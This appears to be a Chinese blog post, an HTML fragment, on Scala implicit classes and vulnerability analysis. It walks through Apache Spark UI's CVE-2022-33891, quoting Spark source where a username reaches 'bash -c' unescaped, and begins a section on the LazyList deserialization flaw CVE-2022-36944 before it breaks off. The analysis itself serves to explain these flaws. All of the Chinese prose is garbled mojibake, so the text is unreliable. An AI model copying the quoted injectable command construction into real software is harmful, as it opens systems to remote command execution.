class="line">        <span class="keyword">if</span> (c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          f</span><br><span class="line">          loop(c - <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      loop(i)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>main</code>æ–¹æ³•ä¸­ä½¿ç”¨äº†ä¸€ä¸ªä¸å¤ªå¸¸ç”¨çš„æ–¹æ³•<code>4.times</code>ï¼Œå¦‚æ­¤åé—¨çš„è¯­æ³•æ—¶å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿè¿™å°±æ˜¯<code>Scala</code>éšå¼ç±»çš„é­”æ³•ã€‚<br>åœ¨<code>Scala</code>ä¸­æ²¡æœ‰<code>Java</code>ä¸­ç±»ä¼¼<code>int</code> è¿™ä¸€ç±»åŸºæœ¬æ•°æ®ç±»å‹ï¼Œæ‰€æœ‰æ•°æ®ç±»å‹å‡æ˜¯åŒ…è£…ç±»å‹ï¼Œå³<code>4</code>è¿™ä¸ªæ•´å‹å­—é¢é‡ä¹ƒæ˜¯<code>Int</code>ç±»å‹çš„å®ä¾‹å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>4.times()</code>å°±è¡¨ç¤ºåœ¨<code>Int</code>çš„å®ä¾‹å¯¹è±¡ä¸Šè°ƒç”¨<code>times</code>æ–¹æ³•ã€‚åœ¨è¿›è¡Œæ–¹æ³•è°ƒç”¨æ—¶ï¼Œé¦–å…ˆä¼šæœç´¢<code>Int</code>ç±»æ˜¯å¦å®šä¹‰äº†<code>times</code>æ–¹æ³•ï¼Œè‹¥æ²¡æœ‰åˆ™åœ¨å½“å‰ä½œç”¨åŸŸä¸­æœç´¢æ˜¯å¦å­˜åœ¨<code>Int</code>ç±»å‹çš„éšå¼ç±»å‹è½¬æ¢ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™åœ¨ç›®æ ‡ç±»å‹ä¸­æœç´¢<code>times</code>æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚<br>å°†ä¸Šè¿°ä»£ç çš„å­—èŠ‚ç åç¼–è¯‘ä¸º<code>Java</code>ä»£ç åå¾—åˆ°ï¼š  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from ImplicitClass.class</span></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitClass</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> intWithTimes <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ImplicitClass$.MODULE$.intWithTimes(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      ImplicitClass$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">intWithTimes</span> &#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">times</span><span class="params">(<span class="keyword">final</span> Function0 f)</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.loop$<span class="number">1</span>(<span class="built_in">this</span>.i, f);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> loop$<span class="number">1</span>(<span class="keyword">final</span> <span class="type">int</span> c, <span class="keyword">final</span> Function0 f$<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="keyword">while</span>(c &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            f$<span class="number">1.</span>apply();</span><br><span class="line">            --c;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="type">BoxedUnit</span> <span class="variable">var10000</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.i = i;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from ImplicitClass$.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ImplicitClass$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> ImplicitClass$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ImplicitClass$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.intWithTimes(<span class="number">4</span>).times(() -&gt; &#123;</span><br><span class="line">         .MODULE$.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> ImplicitClass.intWithTimes <span class="title function_">intWithTimes</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> i)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ImplicitClass</span>.intWithTimes(i);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> ImplicitClass$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// $FF: synthetic method</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Object $deserializeLambda$(SerializedLambda var0) &#123;</span><br><span class="line">      <span class="keyword">return</span> var0.lambdaDeserialize&lt;invokedynamic&gt;(var0);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è°ƒç”¨é€»è¾‘ä¸å‰ä¸¤å°èŠ‚éšå¼å‚æ•°ä¸éšå¼æ–¹æ³•å¦‚å‡ºä¸€è¾™ã€‚</p>
<h2 id="æ¼æ´ä¸¾ä¾‹"><a href="#æ¼æ´ä¸¾ä¾‹" class="headerlink" title="æ¼æ´ä¸¾ä¾‹"></a>æ¼æ´ä¸¾ä¾‹</h2><h3 id="Apache-Spark-UI-è¿œç¨‹å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-33891ï¼‰"><a href="#Apache-Spark-UI-è¿œç¨‹å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-33891ï¼‰" class="headerlink" title="Apache Spark UI è¿œç¨‹å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-33891ï¼‰"></a>Apache Spark UI è¿œç¨‹å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-33891ï¼‰</h3><p><code>Apache Spark UI</code> æ›¾ç»è¢«æŠ«éœ²å­˜åœ¨è¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºå¯¹ç”¨æˆ·æƒé™æ¨¡æ‹Ÿç”¨æˆ·åå‚æ•°å¤„ç†ä¸å½“ã€‚è¯¥æ¼æ´è¾ƒä¸ºç®€å•ï¼Œä¾¿ç›´æ¥åœ¨ä»£ç ä¸­é€šè¿‡æ³¨é‡Šè¿›è¡Œè§£é‡Šè¯´æ˜ã€‚<br><em>HttpSecurityFilter</em>  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">doFilter</span></span>(req: <span class="type">ServletRequest</span>, res: <span class="type">ServletResponse</span>, chain: <span class="type">FilterChain</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> hreq = req.asInstanceOf[<span class="type">HttpServletRequest</span>]</span><br><span class="line">    <span class="keyword">val</span> hres = res.asInstanceOf[<span class="type">HttpServletResponse</span>]</span><br><span class="line">    hres.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache, no-store, must-revalidate&quot;</span>)</span><br><span class="line">    <span class="comment">// è·å–å½“å‰ç™»å½•ç”¨æˆ·å</span></span><br><span class="line">    <span class="keyword">val</span> requestUser = hreq.getRemoteUser()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The doAs parameter allows proxy servers (e.g. Knox) to impersonate other users. For</span></span><br><span class="line">    <span class="comment">// that to be allowed, the authenticated user needs to be an admin.</span></span><br><span class="line">    <span class="comment">// è·å–doAså‚æ•°çš„å€¼</span></span><br><span class="line">    <span class="keyword">val</span> effectiveUser = <span class="type">Option</span>(hreq.getParameter(<span class="string">&quot;doAs&quot;</span>))</span><br><span class="line">      .map &#123; proxy =&gt;</span><br><span class="line">      <span class="comment">// æ£€æŸ¥doAsæ˜¯å¦ä¸å½“å‰ç™»å½•ç”¨æˆ·ç›¸åŒï¼Œå¦‚ä¸ç›¸åŒä¸”å½“å‰ç”¨æˆ·ä¸å…·æœ‰ç®¡ç†å‘˜æƒé™åˆ™é€€å‡º</span></span><br><span class="line">        <span class="keyword">if</span> (requestUser != proxy &amp;&amp; !securityMgr.checkAdminPermissions(requestUser)) &#123;</span><br><span class="line">          hres.sendError(<span class="type">HttpServletResponse</span>.<span class="type">SC_FORBIDDEN</span>,</span><br><span class="line">            <span class="string">s&quot;User <span class="subst">$requestUser</span> is not allowed to impersonate others.&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        proxy</span><br><span class="line">      &#125;</span><br><span class="line">      .getOrElse(requestUser)</span><br><span class="line">    <span class="comment">// æ£€æŸ¥ä»£ç†ç”¨æˆ·æ˜¯å¦å…·æœ‰UIViewæƒé™</span></span><br><span class="line">    <span class="keyword">if</span> (!securityMgr.checkUIViewPermissions(effectiveUser)) &#123;</span><br><span class="line">      hres.sendError(<span class="type">HttpServletResponse</span>.<span class="type">SC_FORBIDDEN</span>,</span><br><span class="line">        <span class="string">s&quot;User <span class="subst">$effectiveUser</span> is not authorized to access this page.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>SecurityManager#isUserInACL</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkAdminPermissions</span></span>(user: <span class="type">String</span>): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    isUserInACL(user, adminAcls, adminAclsGroups)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>SecurityManager#isUserInACL</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">isUserInACL</span></span>(</span><br><span class="line">      user: <span class="type">String</span>,</span><br><span class="line">      aclUsers: <span class="type">Set</span>[<span class="type">String</span>],</span><br><span class="line">      aclGroups: <span class="type">Set</span>[<span class="type">String</span>]): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span> ||</span><br><span class="line">        !aclsEnabled() ||</span><br><span class="line">        aclUsers.contains(<span class="type">WILDCARD_ACL</span>) ||</span><br><span class="line">        aclUsers.contains(user) ||</span><br><span class="line">        aclGroups.contains(<span class="type">WILDCARD_ACL</span>)) &#123;</span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰ç”¨æˆ·å±ç»„</span></span><br><span class="line">      <span class="keyword">val</span> userGroups = <span class="type">Utils</span>.getCurrentUserGroups(sparkConf, user)</span><br><span class="line">      logDebug(<span class="string">s&quot;user <span class="subst">$user</span> is in groups <span class="subst">$&#123;userGroups.mkString(&quot;,&quot;)&#125;</span>&quot;</span>)</span><br><span class="line">      aclGroups.exists(userGroups.contains(_))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em>Utils#getCurrentUserGroups</em>*</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCurrentUserGroups</span></span>(sparkConf: <span class="type">SparkConf</span>, username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// è·å–providerï¼Œé»˜è®¤providerä¸º&quot;org.apache.spark.security.ShellBasedGroupsMappingProvider</span></span><br><span class="line">    <span class="comment">//val USER_GROUPS_MAPPING = ConfigBuilder(&quot;spark.user.groups.mapping&quot;)</span></span><br><span class="line">    <span class="comment">//.version(&quot;2.0.0&quot;)</span></span><br><span class="line">    <span class="comment">//.stringConf</span></span><br><span class="line">    <span class="comment">//.createWithDefault(&quot;org.apache.spark.security.ShellBasedGroupsMappingProvider&quot;)</span></span><br><span class="line">    <span class="keyword">val</span> groupProviderClassName = sparkConf.get(<span class="type">USER_GROUPS_MAPPING</span>)</span><br><span class="line">    <span class="keyword">if</span> (groupProviderClassName != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">val</span> groupMappingServiceProvider = classForName(groupProviderClassName).</span><br><span class="line">          getConstructor().newInstance().</span><br><span class="line">          asInstanceOf[org.apache.spark.security.<span class="type">GroupMappingServiceProvider</span>]</span><br><span class="line">          <span class="comment">// è·å–å±ç»„</span></span><br><span class="line">        <span class="keyword">val</span> currentUserGroups = groupMappingServiceProvider.getGroups(username)</span><br><span class="line">        <span class="keyword">return</span> currentUserGroups</span><br><span class="line">      &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> e: <span class="type">Exception</span> =&gt;</span><br><span class="line">          logError(<span class="string">log&quot;Error getting groups for user=<span class="subst">$&#123;MDC(USER_NAME, username)&#125;</span>&quot;</span>, e)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">EMPTY_USER_GROUPS</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>ShellBasedGroupsMappingProvider#getGroups</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getGroups</span></span>(username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// è·å–å±ç»„</span></span><br><span class="line">    <span class="keyword">val</span> userGroups = getUnixGroups(username)</span><br><span class="line">    logDebug(<span class="string">&quot;User: &quot;</span> + username + <span class="string">&quot; Groups: &quot;</span> + userGroups.mkString(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">    userGroups</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>ShellBasedGroupsMappingProvider#getUnixGroups</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">getUnixGroups</span></span>(username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥è¿›è¡Œå‚æ•°æ‹¼æ¥ï¼Œä¸”ä½¿ç”¨äº†bash -c</span></span><br><span class="line">    <span class="keyword">val</span> cmdSeq = <span class="type">Seq</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id -Gn &quot;</span> + username)</span><br><span class="line">    <span class="comment">// we need to get rid of the trailing &quot;\n&quot; from the result of command execution</span></span><br><span class="line">    <span class="type">Utils</span>.executeAndGetOutput(cmdSeq).stripLineEnd.split(<span class="string">&quot; &quot;</span>).toSet</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>Utils#executeAndGetOutput</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executeAndGetOutput</span></span>(</span><br><span class="line">      command: <span class="type">Seq</span>[<span class="type">String</span>],</span><br><span class="line">      workingDir: <span class="type">File</span> = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">&quot;.&quot;</span>),</span><br><span class="line">      extraEnvironment: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">String</span>] = <span class="type">Map</span>.empty,</span><br><span class="line">      redirectStderr: <span class="type">Boolean</span> = <span class="literal">true</span>): <span class="type">String</span> = &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">val</span> process = executeCommand(command, workingDir, extraEnvironment, redirectStderr)</span><br><span class="line">    <span class="keyword">val</span> output = <span class="keyword">new</span> <span class="type">StringBuilder</span></span><br><span class="line">    <span class="keyword">val</span> threadName = <span class="string">&quot;read stdout for &quot;</span> + command(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">appendToOutput</span></span>(s: <span class="type">String</span>): <span class="type">Unit</span> = output.append(s).append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> stdoutThread = processStreamByLine(threadName, process.getInputStream, appendToOutput)</span><br><span class="line">    <span class="comment">// ç­‰å¾…å‘½ä»¤æ‰§è¡Œå®Œæ¯•</span></span><br><span class="line">    <span class="keyword">val</span> exitCode = process.waitFor()</span><br><span class="line">    stdoutThread.join()   <span class="comment">// Wait for it to finish reading output</span></span><br><span class="line">    <span class="keyword">if</span> (exitCode != <span class="number">0</span>) &#123;</span><br><span class="line">      logError(<span class="string">s&quot;Process <span class="subst">$command</span> exited with code <span class="subst">$exitCode</span>: <span class="subst">$output</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">SparkException</span>(<span class="string">s&quot;Process <span class="subst">$command</span> exited with code <span class="subst">$exitCode</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    output.toString</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>Utils#executeCommand</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executeCommand</span></span>(</span><br><span class="line">      command: <span class="type">Seq</span>[<span class="type">String</span>],</span><br><span class="line">      workingDir: <span class="type">File</span> = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">&quot;.&quot;</span>),</span><br><span class="line">      extraEnvironment: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">String</span>] = <span class="type">Map</span>.empty,</span><br><span class="line">      redirectStderr: <span class="type">Boolean</span> = <span class="literal">true</span>): <span class="type">Process</span> = &#123;</span><br><span class="line">        <span class="comment">// æ„å»ºå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">val</span> builder = <span class="keyword">new</span> <span class="type">ProcessBuilder</span>(command: _*).directory(workingDir)</span><br><span class="line">    <span class="keyword">val</span> environment = builder.environment()</span><br><span class="line">    <span class="keyword">for</span> ((key, value) &lt;- extraEnvironment) &#123;</span><br><span class="line">      environment.put(key, value)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">val</span> process = builder.start()</span><br><span class="line">    <span class="keyword">if</span> (redirectStderr) &#123;</span><br><span class="line">      <span class="keyword">val</span> threadName = <span class="string">&quot;redirect stderr for command &quot;</span> + command(<span class="number">0</span>)</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">log</span></span>(s: <span class="type">String</span>): <span class="type">Unit</span> = logInfo(s)</span><br><span class="line">      processStreamByLine(threadName, process.getErrorStream, log)</span><br><span class="line">    &#125;</span><br><span class="line">    process</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="LazyListååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2022-36944ï¼‰"><a href="#LazyListååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2022-36944ï¼‰" class="headerlink" title="LazyListååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2022-36944ï¼‰"></a>LazyListååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2022-36944ï¼‰</h3><h4 id="LazyListå­˜å‚¨ä¸æ±‚å€¼åŸç†"><a href="#LazyListå­˜å‚¨ä¸æ±‚å€¼åŸç†" class="headerlink" title="LazyListå­˜å‚¨ä¸æ±‚å€¼åŸç†"></a>LazyListå­˜å‚¨ä¸æ±‚å€¼åŸç†</h4><p><code>Scala</code> çš„ <code>LazyList</code> æ˜¯ä¸€ç§æƒ°æ€§æ±‚å€¼çš„é›†åˆç±»å‹ï¼Œå®ƒå¯ä»¥åœ¨éœ€è¦æ—¶æ‰è®¡ç®—å…ƒç´ å€¼ï¼Œè€Œä¸æ˜¯åƒ <code>List</code> ä¸€æ ·åœ¨åˆ›å»ºæ—¶å°±ä¸€æ¬¡æ€§è®¡ç®—æ‰€æœ‰å…ƒç´ ã€‚<code>LazyList</code> å¯ä»¥å¤„ç†æ— é™åºåˆ—å’Œéå¸¸å¤§çš„æ•°æ®é›†ï¼Œè€Œä¸ä¼šå¯¼è‡´å†…å­˜æº¢å‡ºæˆ–æ€§èƒ½é—®é¢˜ã€‚<br>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨<code>LazyList</code>è¿›è¡Œæœ‰é™æ•°æ®å­˜å‚¨ä»¥åŠè®¡ç®—   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">LazyListTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> ll:<span class="type">LazyList</span>[<span class="type">Int</span>] =  <span class="type">LazyList</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">    ll.map(_ * <span class="number">2</span>).take(<span class="number">2</span>).foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç é¦–å…ˆåˆ›å»º<code>LazyList</code>å¯¹è±¡ï¼Œç„¶åå°†æ¯ä¸ªå…ƒç´ éƒ½ä¹˜ä»¥<code>2</code>ï¼Œç„¶åå–å‡ºå‰ä¸¤ä¸ªå…ƒç´ è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸­ã€‚<br><code>LazyList</code>é™¤äº†å¯ä»¥å¤„ç†æœ‰é™æ•°æ®å¤–ï¼Œè¿˜å¯ä»¥å¤„ç†æ— é™æ•°æ®ï¼Œä¸‹é¢çš„ä»£ç åˆ›å»ºäº†ä¸€ä¸ªä»<code>1</code>å¼€å§‹æ­¥é•¿ä¸º<code>2</code>çš„<code>LazyList</code>å¯¹è±¡   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">LazyListTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> ll:<span class="type">LazyList</span>[<span class="type">Int</span>] =  <span class="type">LazyList</span>.from(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    ll.map(_ * <span class="number">2</span>).take(<span class="number">10</span>).foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹<br><img src="/archives/2a377379/image-6.png" alt="alt text"><br>é‚£ä¹ˆ<code>LazyList</code>æ—¶å¦‚ä½•å®ç°æ— é™æ•°æ®çš„å­˜å‚¨çš„å‘¢ï¼Ÿæˆ‘ä»¬å°†ä»<code>form</code>æ–¹æ³•å¼€å§‹è¿›è¡Œè§£é‡Š   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from</span></span>(start: <span class="type">Int</span>, step: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">Int</span>] =</span><br><span class="line">   newLL(sCons(start, from(start + step, step)))</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>start</code>å‚æ•°ä¸ºèµ·å§‹å€¼ï¼Œ<code>step</code>ä¸ºæ­¥é•¿ã€‚æ–¹æ³•ä½“ä¸­é¦–å…ˆè°ƒç”¨äº†<code>sCons</code>æ–¹æ³•ï¼Œå†å°†å…¶è°ƒç”¨ç»“æœä¼ å…¥åˆ°<code>newLL</code>æ–¹æ³•ä¸­ã€‚<code>sCons</code>çš„ç¬¬äºŒä¸ªå‚æ•°é€’å½’åœ°è°ƒç”¨äº†<code>from</code>æ–¹æ³•ï¼Œä¸”å°†<code>from</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºå‰ä¸€æ¬¡è®¡ç®—çš„<code>start</code>çš„å€¼<code>+</code>æ­¥é•¿ã€‚<code>sCons</code>æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ª<code>Cons</code>å¯¹è±¡ï¼Œå…¶ä¸»æ„é€ æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ç§°ä¸º<code>head</code>ï¼Œè¡¨ç¤ºåºåˆ—çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ç§°ä¸º<code>tail</code>ï¼Œè¡¨ç¤ºå‰©ä½™å€¼çš„è®¡ç®—æ–¹æ³•ï¼Œå³LazyListå­˜å‚¨åœ°ä¸æ˜¯æ‰€æœ‰çš„åºåˆ—å€¼ï¼Œè€Œæ˜¯å­˜å‚¨ç€åºåˆ—çš„è®¡ç®—æ–¹æ³•ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Consæ˜¯Stateçš„å­ç±»</span></span><br><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">sCons</span></span>[<span class="type">A</span>](hd: <span class="type">A</span>, tl: <span class="type">LazyList</span>[<span class="type">A</span>]): <span class="type">State</span>[<span class="type">A</span>] = <span class="keyword">new</span> <span class="type">State</span>.<span class="type">Cons</span>[<span class="type">A</span>](hd, tl)</span><br></pre></td></tr></table></figure>
<p>è€Œåœ¨<code>newLL</code>æ–¹æ³•ä¸­åˆ™åˆ›å»ºäº†<code>LazyList</code>å¯¹è±¡ï¼Œ<code>LazyList</code>çš„æ„é€ æ–¹æ³•æ¥å—çš„æ˜¯ä¸€ä¸ªæ— å‚åŒ¿åå‡½æ•°  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">newLL</span></span>[<span class="type">A</span>](state: =&gt; <span class="type">State</span>[<span class="type">A</span>]): <span class="type">LazyList</span>[<span class="type">A</span>] = <span class="keyword">new</span> <span class="type">LazyList</span>[<span class="type">A</span>](() =&gt; state)</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯¹<code>LazyList</code>å¯¹è±¡çš„åˆ›å»ºæµç¨‹æœ‰äº†ä¸€å®šçš„äº†è§£ï¼Œä½†æ˜¯ä»ç„¶ä¸å¤ªèƒ½è§£é‡Šå…¶ä¸ºä½•èƒ½å­˜å‚¨æ— é™çš„æ•°æ®é›†ï¼Œçœ‹åˆ°å…¶å–å€¼éƒ¨åˆ†ï¼Œå…¶åŸç†å°†è±ç„¶å¼€æœ—ã€‚<br>å¯¹<code>LazyList</code>å–å€¼å¯é€šè¿‡<code>foreach</code>è¿›è¡Œï¼Œè¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå•å‚æ•°åŒ¿åå‡½æ•°ç”¨ä»¥å¯¹éå†çš„ç»“æœè¿›è¡Œå¤„ç†ï¼Œå¦‚<code>println</code>    </p>
